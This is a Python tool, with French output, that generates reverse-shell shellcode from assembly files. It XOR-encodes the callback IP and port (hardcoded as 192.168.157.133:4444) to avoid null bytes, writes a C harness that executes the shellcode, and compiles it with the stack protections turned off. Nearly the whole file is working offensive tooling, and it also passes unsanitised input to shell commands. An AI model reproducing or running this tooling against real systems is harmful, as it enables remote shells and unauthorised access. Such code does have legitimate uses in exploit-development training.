#!/usr/bin/env python3
### ==============================================================================
### Created by Migoliatte
### Allows the creation of a polymorphic and / or metamorphic shellcode with an automation of the launch in a C code.
### ==============================================================================

import subprocess
import re  # https://regex101.com/
import os
import sys
import socket

def help():
    print("<---------- HELP ---------->")
    print("-h Affiche ce méssage")
    print("-v Active le mode verbosité")
    print("-vvv Active le mode haute verbosité (objdump)")
    print("-s Création de lu shellcode")
    print("Exemple : python "+sys.argv[0] +
          " -s ../final/asm/fnl_reverse_shell.asm")
    print("-c compile exploit.c et le lance")
    print("Exemple : python "+sys.argv[0] +
          " -c ../final/c/fnl_reverse_shell.c ")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm")

    print("-i Changement de l'ip dans le shellCode")
    print("Exemple : python "+sys.argv[0] +
          " -i 127.0.0.1 -s ../final/asm/fnl_reverse_shell.asm")
    print("-p Changement du port dans le shellCode")
    print("Exemple : python "+sys.argv[0] +
          " -p 4444 -s ../final/asm/fnl_reverse_shell.asm")
    print("Exemple : python "+sys.argv[0] +
          " -c -s ../final/asm/fnl_reverse_shell.asm -i 127.0.0.1 -p 4444 ")
    print("<---------- HELP ---------->")
    exit()


def portInsert(code,port):
    code = code.replace("\\x66\\x68\\x11\\x5c", "\\x66\\x68\\x{b1}\\x{b2}".format(
        b1=port[4:6],
        b2=port[2:4]
    ))
    return code


def ipInsert(ip, code, xor_byte):
    # Inject the IP address
    ip_bytes = []
    for i in range(0, 4):
        ip_bytes.append(hex(ip[i] ^ xor_byte))
    array_hex_ip = []
    for i in range(0, 4):
        if(len(ip_bytes[i][2:]) == 1):
            hex_ip_bytes = ip_bytes[i][1:2]+"0"+ip_bytes[i][2]
            array_hex_ip.append(hex_ip_bytes)
        else:
            array_hex_ip.append(ip_bytes[i][1:])
    code = code.replace("\\xbb\\x80\\xff\\xff\\xfe", "\\xbb\\{b1}\\{b2}\\{b3}\\{b4}".format(
        b1=array_hex_ip[0],
        b2=array_hex_ip[1],
        b3=array_hex_ip[2],
        b4=array_hex_ip[3]
    ))
    return code


def xorFinder(ip):
    xor_byte = 0
    for i in range(1, 256):
        matched_a_byte = False
        #print(" ------------- i  :"+str(i))
        for octet in ip:
            #print(str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            if i == octet:
                #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
                matched_a_byte = True
                break

        if not matched_a_byte:
            #print("dans if : "+str(octet)+" "+str(i)+" "+str(ip)+" "+str(xor_byte))
            xor_byte = i
            break

    # print(xor_byte)
    if xor_byte == 0:
        print("Failed to find a valid XOR byte")
        exit(1)
    return xor_byte


def xorInsert(ip, code,port):
    xor_byte = xorFinder(ip)
    # Inject the XOR bytes
    if(len(hex(xor_byte)[2:]) == 1):
        hex_xor_byte = hex(xor_byte)[1:2]+"0"+hex(xor_byte)[2]
        print("hex_xor_byte : "+hex_xor_byte)
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\{x}\{x}\{x}\{x}".format(x=hex_xor_byte))
    else:
        code = code.replace("\\xb8\\xff\\xff\\xff\\xff",
                            "\\xb8\\x{x}\\x{x}\\x{x}\\x{x}".format(x=hex(xor_byte)[1:3]))
        print("xor_byte : "+xor_byte)
        print("hex(xor_byte)[1:3] : "+hex(xor_byte)[1:3])

    code = ipInsert(ip, code, xor_byte)
    return portInsert(code,port)


def CheckNullBytes(verbose, shellcode, nbrLine):
    for i in range(0, len(shellcode), 2):
        if shellcode[i:i+2] == "00":
            print("Il y a un ou plusieurs NullBytes à la " +
                  str(nbrLine)+"ieme ligne de l'opcode : " + shellcode)
            return 1
    return 0


def objdump(verbose,  programme_Path, programme_Name):
    print("<---------- Lancement de ObjDump en cours ---------->")
    os.system("nasm -f elf "+programme_Path+programme_Name+".asm  && ld " +
              programme_Path+programme_Name+".o -m elf_i386 -o "+programme_Path+programme_Name)
    if(verbose):
        print("Lancement de la commande objdump -d " +
              programme_Path+programme_Name)
    objdump = subprocess.run(
        'objdump -d '+programme_Path+programme_Name, shell=True, stdout=subprocess.PIPE)
    objdump = objdump.stdout.decode("utf-8")
    if(verbose == 3):
        print("Resultat de OBJDUMP :"+objdump)
    objdump = objdump.replace("\t", "")
    result = re.findall(":[0-9a-f ]{21}", objdump)
    return result


def cleanOpCode(verbose, programme_Path, programme_Name):
    resultfinal = []
    nbrLine = 0
    nullByte = 0

    for res in objdump(verbose, programme_Path, programme_Name):
        nullByte += CheckNullBytes(verbose, res, nbrLine)
        resultfinal.append(res[1:].replace(" ", ""))
        nbrLine += 1

    print("<---------- Check des NUllsBytes en cours ---------->")
    if nullByte > 0:
        print("Des NullBytes ont été détécté.")
    elif(verbose):
        print("Aucun NullBytes dans ce shellcode ! ")

    print("<---------- Nettoyage de l'opcode en cours ---------->")
    resultfinal = "".join(resultfinal)

    if(verbose):
        print("Opcode nettoyé : "+resultfinal)
    return resultfinal


def shellcodeCreation(verbose, programme_Name, programme_Path):
    resultfinal = cleanOpCode(verbose, programme_Path, programme_Name)
    print("<---------- Génération de l'exploit en cours ---------->")
    exploit = []
    exploit.append("")
    exploit.append("")
    for i in range(0, len(resultfinal), 2):
        exploit[0] += "\\x"+resultfinal[i:i+2]
        exploit[1] += "\\\\x"+resultfinal[i:i+2]
    print("Shellcode : ")
    print(exploit[0])
    print("Shellcode : ")
    print(exploit[1])
    if(verbose):
        print("Taille de l'exploit : "+str(int(len(resultfinal)/2)))
    return exploit


def lancementCodeC(verbose, programmeC_Name, programmeC_Path):
    print("<---------- Compilation et lancement de " +
          programmeC_Path+programmeC_Name+".c ---------->")

    if(verbose):
        print("Lancement de la commande gcc -o "+programmeC_Path+programmeC_Name+".out " +
              programmeC_Path+programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    os.system("gcc -o "+programmeC_Path+programmeC_Name+".out "+programmeC_Path +
              programmeC_Name+".c -z execstack -m32 -fno-stack-protector")
    if(verbose):
        print("Lancement de l'executable "+programmeC_Path+programmeC_Name)
    os.system(programmeC_Path+programmeC_Name+".out")


def createFileC(verbose, programmeC_Name, programmeC_Path, shellcode):
    print("<---------- Création du fichier " +
          programmeC_Path+programmeC_Name+".c ---------->")

    with open(programmeC_Path+programmeC_Name+".c", "w") as file:
        file.write('#include <stdio.h>\n#include <string.h>\n\n')
        file.write('int main(void)\n{\n')
        file.write('\tunsigned char code[] = \\\n')
        file.write('\t\"'+shellcode+'\" ;\n')
        file.write('\tprintf("Shellcode length: %d\\n", strlen(code)); \n')
        file.write('\tvoid (*s)() = (void *)code;\n\ts();\n')
        file.write('\treturn 0;\n}')
    if(verbose == 3):
        print("création du fichier C :")
        print('#include <stdio.h>\n#include <string.h>\n')
        print('int main(void)\n{')
        print('\tunsigned char code[] = \\')
        print('\t\"'+shellcode+'\" ;')
        print('\tprintf("Shellcode length: %d\\n", strlen(code)); ')
        print('\tvoid (*s)() = (void *)code;\n\ts();')
        print('\treturn 0;\n}')


def all(verbose, programmeC_Name, programmeC_Path):
    shellcode = shellcodeCreation(verbose, programmeC_Name, programmeC_Path)
    programmeC_Path = programmeC_Path.split("asm")
    programmeC_Path = programmeC_Path[0]+"c"+programmeC_Path[1]
    #ip = socket.inet_aton("127.0.0.1")
    ip = socket.inet_aton("192.168.157.133")
    port = hex(socket.htons(int("4444")))
    modifiedShellcode=xorInsert(ip,shellcode[0],port)
    print("MODIFIé")
    print(modifiedShellcode)
    createFileC(verbose, programmeC_Name, programmeC_Path, modifiedShellcode)
    #createFileC(verbose, programmeC_Name, programmeC_Path, shellcode[0])
    lancementCodeC(verbose, programmeC_Name, programmeC_Path)


def verifIfExploitIsSet(programmeC_Name, programmeC_Path):
    result = input("Avez vous pensé à changer la variable 'shellcode' de " +
                   programmeC_Path+programmeC_Name+".c ([y/yes/o/oui]/[n/no/non]) :  ")
    result = result.lower()
    if(result == "y" or result == "yes" or result == "o" or result == "oui" or result == ""):
        print("Très bien, continuons !")
    elif(result == "n" or result == "no" or result == "non"):
        print("Allez le modifier !")
        exit()
    else:
        print("Merci de répondre y/yes/o/oui ou n/no/non merci !")
        exit()


def nameCleaner(verbose, fileName):
    print("<---------- Creation des noms de fichiers ---------->")
    if(verbose):
        print("fileName : "+fileName)
    programmeName = fileName.split("/")
    programmePath = ""
    arrayName = []
    for i in range(0, len(programmeName)-1):
        programmePath += programmeName[i]+"/"
    programmeName = programmeName[len(programmeName)-1]
    programmeName = programmeName.split(".asm")
    programmeName = programmeName[0].split(".c")
    programmeName = programmeName[0]
    if(verbose):
        print("programmeName : "+programmeName)
        print("programmePath : "+programmePath)
    arrayName.append(programmeName)
    arrayName.append(programmePath)
    return arrayName


def recupArgument(verbose, fileName):
    print("<---------- Récupération du nom du fichier en cours ---------->")
    file_test = subprocess.run(
        "ls "+fileName, shell=True, stdout=subprocess.PIPE)
    exist = 0
    name = ""
    if(file_test.returncode != 0 or fileName == "" or fileName.find("-") == 0):
        while exist == 0:
            os.system(
                "echo Vous êtes actuellement ici : $(pwd), dans votre dossier il y a : $(ls)")
            name = input("Entrez le nom du fichier :")
            file_test = subprocess.run(
                "ls "+name, shell=True, stdout=subprocess.PIPE)
            if(file_test.returncode != 0 or name == "" or name.find("-") == 0):
                print("Le fichier "+name+" n'existe pas !")
            else:
                exist = 1
    else:
        return fileName
    return name


def menu():
    array = [0, 0, 0, 0, "", 0, "", 0, ""]
    for i in range(0, len(sys.argv)):
        if str(sys.argv[i]) == "-h":
            array[0] = 1
        elif str(sys.argv[i]) == "-v":
            array[3] = 1
        elif str(sys.argv[i]) == "-vvv":
            array[3] = 3
        elif str(sys.argv[i]) == "-p":
            array[5] = 1
            if(len(sys.argv) > i+1):
                array[6] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-i":
            array[7] = 1
            if(len(sys.argv) > i+1):
                array[8] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-s":
            array[1] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
        elif str(sys.argv[i]) == "-c":
            array[2] = 1
            if(len(sys.argv) > i+1):
                array[4] = sys.argv[i+1]
    return array


def main():
    menuResult = menu()
    print(menuResult)
    if menuResult[0] == 1:
        help()
    else:
        fileName = recupArgument(menuResult[3], menuResult[4])
        arrayName = nameCleaner(menuResult[3], fileName)

        if menuResult[1] == 1 and menuResult[2] == 1:
            all(menuResult[3], arrayName[0], arrayName[1])
        elif menuResult[1] == 1:
            shellcodeCreation(menuResult[3], arrayName[0], arrayName[1])
        elif menuResult[2] == 1:
            verifIfExploitIsSet(arrayName[0], arrayName[1])
            lancementCodeC(menuResult[3], arrayName[0], arrayName[1])
            exit()
        else:
            help()


if __name__ == "__main__":
    main()
